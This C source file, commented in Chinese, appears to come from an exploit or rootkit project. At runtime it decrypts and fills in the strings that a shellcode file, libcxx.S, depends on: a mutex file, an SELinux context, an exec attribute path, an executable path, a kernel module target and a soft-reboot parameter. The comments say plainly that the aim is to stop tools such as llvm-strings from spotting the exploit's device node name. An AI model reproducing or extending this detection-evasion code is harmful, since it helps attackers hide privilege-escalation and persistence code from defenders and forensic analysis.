/* libcxx.S shellcode 里用到的字符串。
 *
 * 原来它们是 .asciz 明文，躺在 .data 段里 —— llvm-strings 一眼就能看到
 * DirtyFrag 的独占设备节点名，属于最强指纹。
 * 现在 .S 里只留等长零填充（字节数经汇编器逐符号比对，13/13 偏移全等），
 * 真实内容由本文件在运行时解密写入。
 *
 * 本文件由 tools/obf_strings_gen.py 与其它 .c 一起扫描，字面量会被换成 OBF(id)。
 * 注意：生成器按行处理，注释里的引号串也会被替换 —— 别在注释里写引号。
 */
#include <stddef.h>
#include "obf_strings.h"

extern char mutex_file[9];
extern char selinux_ctx[23];
extern char attr_exec[21];
extern char exe_path[19];
extern char ko_target[64];
extern char param_soft_reboot[14];

void obf_asm_init(void) {
    obf_fill(mutex_file,        sizeof(mutex_file),        OBF(67));
    obf_fill(selinux_ctx,       sizeof(selinux_ctx),       OBF(114));
    obf_fill(attr_exec,         sizeof(attr_exec),         OBF(115));
    obf_fill(exe_path,          sizeof(exe_path),          OBF(116));
    obf_fill(ko_target,         sizeof(ko_target),         OBF(117));
    obf_fill(param_soft_reboot, sizeof(param_soft_reboot), OBF(118));
}
